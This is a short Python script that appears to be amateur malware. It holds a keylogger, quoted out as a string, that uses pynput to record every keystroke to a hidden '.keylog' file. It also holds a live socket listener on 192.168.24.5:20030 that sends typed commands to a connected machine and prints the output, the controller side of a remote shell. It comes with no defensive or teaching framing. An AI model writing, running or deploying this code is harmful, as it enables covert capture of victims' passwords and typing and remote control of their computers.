"""from pynput.keyboard import Key, Listener

def on_press(key):
    f = open(".keylog", "a")
    if str(key).split(".")[0] == "Key":
        f.write("\n" + str(key) + "\n")
    else:
        f.write(str(key))

with Listener(on_press = on_press, on_release = None) as listener:
    listener.join()"""

import socket

HOST = "192.168.24.5"
PORT = 20030

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()

while True:
    comm = input("Enter commmand : ")
    conn.send(bytes(comm + " c", encoding = "utf8"))
    print(conn.recv(1024).decode())